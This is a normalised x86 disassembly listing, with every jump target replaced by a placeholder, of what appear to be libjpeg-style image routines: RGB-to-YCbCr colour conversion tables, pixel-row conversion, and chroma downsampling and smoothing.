mov [ esp + 0x4 ] ecx
mov ebx [ esi + 0x40 ]
mov eax [ esp ]
lea edi [ eax + 0x40 ]
jmp r-xdata
mov ebx eax
inc eax
shl ebx 0x7
add ebx ecx
mov [ edx ] ebx
add edx 0x4
cmp eax 0xa
jl r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax + 0x40 ] edx
mov eax [ esi + 0x38 ]
cmp eax [ esp + 0x4 ]
jg r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x1c ]
call sub_497758
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x20 ]
call sub_497758
push eax
mov eax esi
mov ecx [ ebx + 0xc ]
mov edx 0x1
push ecx
xor ecx ecx
mov ebp [ eax + 0x4 ]
call [ ebp + 0x14 ]
mov [ edi ] eax
add edi 0x4
inc [ esp + 0x4 ]
add ebx 0x54
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_49ab1c
push ebx
mov ebx eax
mov eax ebx
push esi
push ecx
mov ecx 0x2000
mov esi [ ebx + 0x15c ]
mov ebx [ eax + 0x4 ]
mov edx 0x1
call [ ebx ]
mov [ esp ] eax
mov [ esi + 0x8 ] eax
xor edx edx
mov ecx [ esp ]
mov eax ecx
imul ecx edx 0x4c8b
mov [ eax ] ecx
imul ecx edx 0x9646
mov [ eax + 0x400 ] ecx
imul ecx edx 0x1d2f
add ecx 0x8000
mov [ eax + 0x800 ] ecx
imul ecx edx 0xffffd4cd
mov [ eax + 0xc00 ] ecx
imul ecx edx 0xffffab33
mov [ eax + 0x1000 ] ecx
mov ecx edx
shl ecx 0xf
add ecx 0x807fff
mov [ eax + 0x1400 ] ecx
imul ecx edx 0xffff94d1
mov [ eax + 0x1800 ] ecx
imul ecx edx 0xffffeb2f
mov [ eax + 0x1c00 ] ecx
inc edx
add eax 0x4
cmp edx 0xff
jle r-xdata
pop edx
pop esi
pop ebx
retn
sub_49abbc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x15c ]
mov esi [ edx + 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
add [ ebp - 0x4 ] 0x4
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov edx [ ebp + 0xc ]
mov edx [ ecx + edx * 4 ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov ebx [ ebp + 0xc ]
mov ecx [ ecx + ebx * 4 ]
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x8 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebx + edi * 4 ]
inc [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x14 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor edx edx
xor ecx ecx
mov dl [ eax + 0x2 ]
xor ebx ebx
mov cl [ eax + 0x1 ]
mov bl [ eax ]
mov [ ebp - 0xc ] ebx
add eax 0x3
mov ebx [ esi + edx * 4 ]
mov edi [ ebp - 0xc ]
add ebx [ esi + ecx * 4 + 0x400 ]
add ebx [ esi + edi * 4 + 0x800 ]
mov edi [ ebp - 0x18 ]
sar ebx 0x10
mov [ edi ] bl
mov ebx [ esi + edx * 4 + 0xc00 ]
mov edi [ ebp - 0xc ]
add ebx [ esi + ecx * 4 + 0x1000 ]
add ebx [ esi + edi * 4 + 0x1400 ]
mov edi [ ebp - 0x1c ]
sar ebx 0x10
mov [ edi ] bl
mov edx [ esi + edx * 4 + 0x1400 ]
add edx [ esi + ecx * 4 + 0x1800 ]
mov ecx [ ebp - 0xc ]
add edx [ esi + ecx * 4 + 0x1c00 ]
mov ecx [ ebp - 0x20 ]
sar edx 0x10
mov [ ecx ] dl
inc [ ebp - 0x10 ]
inc [ ebp - 0x20 ]
inc [ ebp - 0x1c ]
inc [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x14 ]
jb r-xdata
sub_49acc4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x15c ]
mov esi [ edx + 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
add [ ebp - 0x4 ] 0x4
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov edx [ ebp + 0xc ]
mov ecx [ ecx + edx * 4 ]
inc [ ebp + 0xc ]
xor edx edx
cmp edx [ ebp - 0x18 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor ebx ebx
inc edx
mov bl [ eax + 0x2 ]
mov [ ebp - 0xc ] ebx
xor ebx ebx
mov bl [ eax + 0x1 ]
mov [ ebp - 0x10 ] ebx
xor ebx ebx
mov bl [ eax ]
add eax 0x3
mov [ ebp - 0x14 ] ebx
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
mov ebx [ esi + ebx * 4 ]
add ebx [ esi + edi * 4 + 0x400 ]
mov edi [ ebp - 0x14 ]
add ebx [ esi + edi * 4 + 0x800 ]
sar ebx 0x10
mov [ ecx ] bl
inc ecx
cmp edx [ ebp - 0x18 ]
jb r-xdata
sub_49ad50
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x15c ]
mov esi [ edx + 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
add [ ebp - 0x4 ] 0x4
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov edx [ ebp + 0xc ]
mov edx [ ecx + edx * 4 ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov ebx [ ebp + 0xc ]
mov ecx [ ecx + ebx * 4 ]
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x8 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebx + edi * 4 ]
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0xc ]
mov edi [ ebp + 0xc ]
mov ebx [ ebx + edi * 4 ]
inc [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x14 ] edi
mov edi [ ebp - 0x10 ]
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] edx
mov edx ebx
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x18 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor edx edx
mov edi 0xff
mov dl [ eax ]
push edx
mov edx 0xff
pop ecx
sub edx ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
push ecx
mov ecx 0xff
pop ebx
sub ecx ebx
xor ebx ebx
mov bl [ eax + 0x2 ]
sub edi ebx
mov [ ebp - 0xc ] edi
mov ebx [ ebp - 0x1c ]
mov edi ebx
mov bl [ eax + 0x3 ]
add eax 0x4
mov [ edi ] bl
mov ebx [ esi + edx * 4 ]
mov edi [ ebp - 0xc ]
add ebx [ esi + ecx * 4 + 0x400 ]
add ebx [ esi + edi * 4 + 0x800 ]
mov edi [ ebp - 0x20 ]
sar ebx 0x10
mov [ edi ] bl
mov ebx [ esi + edx * 4 + 0xc00 ]
mov edi [ ebp - 0xc ]
add ebx [ esi + ecx * 4 + 0x1000 ]
add ebx [ esi + edi * 4 + 0x1400 ]
mov edi [ ebp - 0x24 ]
sar ebx 0x10
mov [ edi ] bl
mov edx [ esi + edx * 4 + 0x1400 ]
add edx [ esi + ecx * 4 + 0x1800 ]
mov ecx [ ebp - 0xc ]
add edx [ esi + ecx * 4 + 0x1c00 ]
mov ecx [ ebp - 0x28 ]
sar edx 0x10
mov [ ecx ] dl
inc [ ebp - 0x14 ]
inc [ ebp - 0x28 ]
inc [ ebp - 0x24 ]
inc [ ebp - 0x20 ]
inc [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x18 ]
jb r-xdata
sub_49ae94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ eax + 0x1c ]
mov [ ebp - 0x4 ] ebx
mov eax [ eax + 0x24 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
mov eax [ ecx ]
mov ebx [ ebp + 0xc ]
mov esi [ edx ]
add edx 0x4
mov eax [ eax + ebx * 4 ]
xor edi edi
inc [ ebp + 0xc ]
cmp edi [ ebp - 0x4 ]
jae r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov bl [ esi ]
inc edi
mov [ eax ] bl
inc eax
add esi [ ebp - 0x8 ]
cmp edi [ ebp - 0x4 ]
jb r-xdata
sub_49aee0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ eax + 0x38 ]
mov [ ebp - 0x8 ] ebx
mov eax [ eax + 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
add edx 0x4
inc [ ebp + 0xc ]
mov eax [ ebp - 0x10 ]
mov ebx [ ebp + 0xc ]
xor edi edi
mov esi [ edx ]
mov eax [ eax ]
cmp edi [ ebp - 0xc ]
mov eax [ eax + ebx * 4 ]
jae r-xdata
inc [ ebp - 0x4 ]
add [ ebp - 0x10 ] 0x4
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
mov ebx [ ebp - 0x4 ]
inc edi
mov bl [ esi + ebx ]
mov [ eax ] bl
inc eax
add esi [ ebp - 0x8 ]
cmp edi [ ebp - 0xc ]
jb r-xdata
sub_49af58
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0xc
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov esi eax
mov [ ebx + 0x15c ] esi
mov [ esi ] sub_49af54
mov eax [ ebx + 0x28 ]
dec eax
je r-xdata
cmp [ ebx + 0x24 ] 0x1
je r-xdata
dec eax
sub eax 0x2
jb r-xdata
mov ecx [ ebx + 0x3c ]
cmp ecx 0x5
ja r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x9
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ ebx + 0x24 ] 0x3
je r-xdata
sub eax 0x2
jb r-xdata
mov ecx [ ebx + 0x3c ]
cmp ecx [ ebx + 0x28 ]
jne r-xdata
jmp [ ecx * 4 + jump_table_49affb ]
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x9
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ ebx + 0x24 ] 0x4
je r-xdata
jmp r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x1b
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x38 ]
cmp eax [ ebx + 0x24 ]
je r-xdata
cmp [ ebx + 0x38 ] 0x1
je r-xdata
cmp [ ebx + 0x38 ] 0x3
je r-xdata
cmp [ ebx + 0x38 ] 0x3
je r-xdata
cmp [ ebx + 0x38 ] 0x4
je r-xdata
cmp [ ebx + 0x38 ] 0x4
je r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x9
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ ebx + 0x24 ] 0x1
jge r-xdata
mov [ esi + 0x4 ] sub_49aee0
pop esi
pop ebx
retn
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xa
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0xa
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0xa
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x28 ] 0x4
jne r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0xa
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x28 ] 0x4
jne r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0xa
mov edx [ eax ]
call [ edx ]
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x9
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
mov [ esi + 0x4 ] sub_49ae94
pop esi
pop ebx
retn
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x1b
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
mov [ esi + 0x4 ] sub_49aee0
pop esi
pop ebx
retn
cmp [ ebx + 0x28 ] 0x3
jne r-xdata
mov [ esi ] sub_49ab1c
mov [ esi + 0x4 ] sub_49abbc
pop esi
pop ebx
retn
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x1b
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
mov [ esi + 0x4 ] sub_49aee0
pop esi
pop ebx
retn
cmp [ ebx + 0x28 ] 0x5
jne r-xdata
mov [ esi ] sub_49ab1c
mov [ esi + 0x4 ] sub_49ad50
pop esi
pop ebx
retn
cmp [ ebx + 0x28 ] 0x3
jne r-xdata
mov [ esi ] sub_49ab1c
mov [ esi + 0x4 ] sub_49acc4
pop esi
pop ebx
retn
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x1b
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
mov [ esi + 0x4 ] sub_49aee0
pop esi
pop ebx
retn
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x1b
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
mov [ esi + 0x4 ] sub_49aee0
pop esi
pop ebx
retn
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x1b
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
mov [ esi + 0x4 ] sub_49ae94
pop esi
pop ebx
retn
sub_49b1a8
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
sub edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jle r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
xor ecx ecx
mov edi eax
cmp ecx [ ebp - 0x4 ]
jge r-xdata
mov eax [ edi ]
mov esi [ ebp - 0xc ]
add eax [ ebp - 0x8 ]
test esi esi
mov dl [ eax - 0x1 ]
jle r-xdata
inc ecx
add edi 0x4
cmp ecx [ ebp - 0x4 ]
jl r-xdata
mov [ eax ] dl
inc eax
dec esi
test esi esi
jg r-xdata
sub_49b1f8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi eax
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov eax [ esi + 0x160 ]
xor edx edx
mov [ ebp - 0xc ] edx
add eax 0xc
mov ebx [ esi + 0x40 ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp + 0xc ]
mov ecx edx
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x4 ]
mov edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ esi + 0x38 ]
jl r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
shl edx 0x2
mov eax [ ecx ]
mov ecx [ ebp - 0x14 ]
add eax edx
mov edx [ ecx ]
mov ecx [ ebp + 0x8 ]
imul ecx [ ebx + 0xc ]
shl ecx 0x2
add edx ecx
mov ecx eax
push edx
mov edx ebx
mov edi [ ebp - 0x18 ]
mov eax esi
call [ edi ]
add [ ebp - 0x10 ] 0x4
add [ ebp - 0x14 ] 0x4
add [ ebp - 0x18 ] 0x4
inc [ ebp - 0xc ]
add ebx 0x54
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_49b27c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1c ]
shl edx 0x3
mov [ ebp - 0x2c ] edx
mov eax [ ecx + 0xe4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + 0x8 ]
cdq
idiv ebx
mov [ ebp - 0x14 ] eax
mov ebx [ ecx + 0xe8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov esi [ edx + 0xc ]
cdq
idiv esi
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x1c ]
sar edx 0x1
jns r-xdata
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x2c ]
imul [ ebp - 0x14 ]
push eax
mov edx ebx
mov ecx [ ecx + 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_49b1a8
xor edx edx
xor ecx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
mov edx eax
mov [ ebp - 0x34 ] edx
jmp r-xdata
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
cmp edx [ ebp - 0x10 ]
jg r-xdata
mov ecx [ ebp - 0x34 ]
xor edx edx
mov eax [ ecx ]
xor ecx ecx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] ecx
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x2c ]
jae r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x18 ]
add [ ebp - 0xc ] ecx
inc [ ebp - 0x10 ]
add [ ebp - 0x34 ] 0x4
xor ecx ecx
xor ebx ebx
cmp ebx [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x20 ]
add eax ecx
mov ecx [ ebp - 0x30 ]
cdq
idiv [ ebp - 0x1c ]
mov [ ecx ] al
inc [ ebp - 0x30 ]
inc [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
add [ ebp - 0x28 ] eax
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x2c ]
jb r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
add eax ebx
mov eax [ edx + eax * 4 ]
xor edx edx
add eax [ ebp - 0x28 ]
cmp edx [ ebp - 0x14 ]
jge r-xdata
inc ebx
cmp ebx [ ebp - 0x18 ]
jl r-xdata
movzx esi [ eax ]
add ecx esi
inc eax
inc edx
cmp edx [ ebp - 0x14 ]
jl r-xdata
sub_49b38c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov esi [ ebp + 0x8 ]
push 0x0
mov eax [ ebx + 0xe8 ]
mov edi edx
push eax
mov ecx esi
mov edx [ ebx + 0x1c ]
push edx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_497770
mov ecx [ edi + 0x1c ]
shl ecx 0x3
push ecx
mov ecx [ ebx + 0x1c ]
mov edx [ ebx + 0xe8 ]
mov eax esi
call sub_49b1a8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_49b3d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov ebx ecx
mov ecx [ edx + 0x1c ]
shl ecx 0x3
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
add edx edx
push edx
mov edx [ eax + 0xe8 ]
mov ecx [ eax + 0x1c ]
mov eax ebx
call sub_49b1a8
xor ecx ecx
mov eax ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x14 ] eax
mov edx [ ebp + 0x8 ]
mov ecx edx
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
cmp edx [ ebp - 0x8 ]
jg r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
xor esi esi
mov edx [ eax ]
mov eax [ ecx ]
xor ecx ecx
cmp esi [ ebp - 0xc ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc [ ebp - 0x8 ]
add [ ebp - 0x14 ] 0x4
add [ ebp - 0x10 ] 0x4
movzx edi [ eax + 0x1 ]
xor ebx ebx
inc esi
mov bl [ eax ]
add eax 0x2
add ebx edi
add ebx ecx
xor ecx 0x1
sar ebx 0x1
mov [ edx ] bl
inc edx
cmp esi [ ebp - 0xc ]
jb r-xdata
sub_49b46c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov ebx ecx
mov ecx [ edx + 0x1c ]
shl ecx 0x3
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
add edx edx
push edx
mov edx [ eax + 0xe8 ]
mov ecx [ eax + 0x1c ]
mov eax ebx
call sub_49b1a8
xor ecx ecx
mov eax ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x18 ] eax
mov edx [ ebp + 0x8 ]
mov ecx edx
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
cmp edx [ ebp - 0x8 ]
jg r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
xor ebx ebx
mov esi 0x1
mov ecx [ eax ]
mov eax [ edx ]
mov edx [ ebp - 0x18 ]
mov edx [ edx + 0x4 ]
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp - 0x10 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x18 ] 0x8
inc [ ebp - 0x8 ]
add [ ebp - 0x14 ] 0x4
movzx edi [ eax + 0x1 ]
xor ebx ebx
mov bl [ eax ]
add eax 0x2
add ebx edi
movzx edi [ edx ]
add ebx edi
movzx edi [ edx + 0x1 ]
add ebx edi
add edx 0x2
add ebx esi
xor esi 0x3
sar ebx 0x2
mov [ ecx ] bl
inc ecx
inc [ ebp - 0xc ]
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp - 0x10 ]
jb r-xdata
sub_49b524
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x4 ] edx
mov esi ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1c ]
lea eax [ esi - 0x4 ]
shl edx 0x3
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x10 ]
add ecx ecx
push ecx
mov edx [ ebx + 0xe8 ]
mov ecx [ ebx + 0x1c ]
add edx 0x2
call sub_49b1a8
mov eax [ ebx + 0xbc ]
mov ecx 0x4000
mov edx eax
shl edx 0x4
shl eax 0x4
lea edx [ edx + edx * 4 ]
sub ecx edx
mov edx esi
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x2c ] edx
mov ecx [ ebp + 0x8 ]
mov eax ecx
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
cmp edx [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0x28 ]
mov ecx [ edx ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x2c ]
mov ebx [ ebp - 0x2c ]
mov edx [ ebp - 0x2c ]
mov ecx [ ebp - 0x2c ]
mov eax [ eax ]
mov esi [ ebx + 0x8 ]
mov edx [ edx + 0x4 ]
xor ebx ebx
movzx edi [ eax + 0x1 ]
mov bl [ eax ]
mov ecx [ ecx - 0x4 ]
add ebx edi
movzx edi [ edx ]
add ebx edi
movzx edi [ edx + 0x1 ]
add ebx edi
mov [ ebp - 0x18 ] ebx
xor ebx ebx
movzx edi [ ecx + 0x1 ]
mov bl [ ecx ]
add ebx edi
movzx edi [ esi ]
add ebx edi
movzx edi [ esi + 0x1 ]
add ebx edi
movzx edi [ eax ]
add ebx edi
movzx edi [ eax + 0x2 ]
add ebx edi
add eax 0x2
movzx edi [ edx ]
add ebx edi
movzx edi [ edx + 0x2 ]
add ebx edi
add edx 0x2
mov [ ebp - 0x1c ] ebx
mov ebx [ ebp - 0x1c ]
add [ ebp - 0x1c ] ebx
movzx edi [ ecx + 0x2 ]
xor ebx ebx
mov bl [ ecx ]
add ecx 0x2
add ebx edi
movzx edi [ esi ]
add ebx edi
movzx edi [ esi + 0x2 ]
add ebx edi
add esi 0x2
add [ ebp - 0x1c ] ebx
mov ebx [ ebp - 0x18 ]
mov edi [ ebp - 0x1c ]
imul edi [ ebp - 0x24 ]
imul ebx [ ebp - 0x20 ]
add ebx edi
mov [ ebp - 0x18 ] ebx
mov ebx [ ebp - 0x18 ]
mov edi [ ebp - 0x14 ]
add ebx 0x8000
sar ebx 0x10
mov [ edi ] bl
inc [ ebp - 0x14 ]
mov ebx [ ebp - 0x10 ]
sub ebx 0x2
mov [ ebp - 0xc ] ebx
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
movzx edi [ eax + 0x1 ]
xor ebx ebx
mov bl [ eax ]
add ebx edi
movzx edi [ edx ]
add ebx edi
movzx edi [ edx + 0x1 ]
add ebx edi
mov [ ebp - 0x18 ] ebx
xor ebx ebx
movzx edi [ ecx + 0x1 ]
mov bl [ ecx ]
add ebx edi
movzx edi [ esi ]
add ebx edi
movzx edi [ esi + 0x1 ]
add ebx edi
movzx edi [ eax - 0x1 ]
movzx eax [ eax + 0x1 ]
add ebx edi
add ebx eax
xor eax eax
mov al [ edx - 0x1 ]
movzx edx [ edx + 0x1 ]
add ebx eax
add ebx edx
xor edx edx
mov [ ebp - 0x1c ] ebx
mov eax [ ebp - 0x1c ]
add [ ebp - 0x1c ] eax
xor eax eax
mov dl [ ecx - 0x1 ]
mov al [ esi - 0x1 ]
movzx ecx [ ecx + 0x1 ]
add edx ecx
xor ecx ecx
mov cl [ esi + 0x1 ]
add edx eax
add edx ecx
add [ ebp - 0x1c ] edx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
imul eax [ ebp - 0x24 ]
imul edx [ ebp - 0x20 ]
add edx eax
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
add edx 0x8000
sar edx 0x10
mov [ ecx ] dl
add [ ebp - 0x2c ] 0x8
inc [ ebp - 0x8 ]
add [ ebp - 0x28 ] 0x4
movzx edi [ eax + 0x1 ]
xor ebx ebx
mov bl [ eax ]
add ebx edi
movzx edi [ edx ]
add ebx edi
movzx edi [ edx + 0x1 ]
add ebx edi
mov [ ebp - 0x18 ] ebx
xor ebx ebx
movzx edi [ ecx + 0x1 ]
mov bl [ ecx ]
add ebx edi
movzx edi [ esi ]
add ebx edi
movzx edi [ esi + 0x1 ]
add ebx edi
movzx edi [ eax - 0x1 ]
add ebx edi
movzx edi [ eax + 0x2 ]
add ebx edi
add eax 0x2
movzx edi [ edx - 0x1 ]
add ebx edi
movzx edi [ edx + 0x2 ]
add ebx edi
add edx 0x2
mov [ ebp - 0x1c ] ebx
mov ebx [ ebp - 0x1c ]
add [ ebp - 0x1c ] ebx
movzx edi [ ecx + 0x2 ]
xor ebx ebx
mov bl [ ecx - 0x1 ]
add ecx 0x2
add ebx edi
movzx edi [ esi - 0x1 ]
add ebx edi
movzx edi [ esi + 0x2 ]
add ebx edi
add esi 0x2
add [ ebp - 0x1c ] ebx
mov ebx [ ebp - 0x18 ]
mov edi [ ebp - 0x1c ]
imul edi [ ebp - 0x24 ]
imul ebx [ ebp - 0x20 ]
add ebx edi
mov [ ebp - 0x18 ] ebx
mov ebx [ ebp - 0x18 ]
mov edi [ ebp - 0x14 ]
add ebx 0x8000
sar ebx 0x10
mov [ edi ] bl
inc [ ebp - 0x14 ]
dec [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x0
ja r-xdata
sub_49b7b4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
mov ebx eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov esi ecx
mov edx [ eax + 0x1c ]
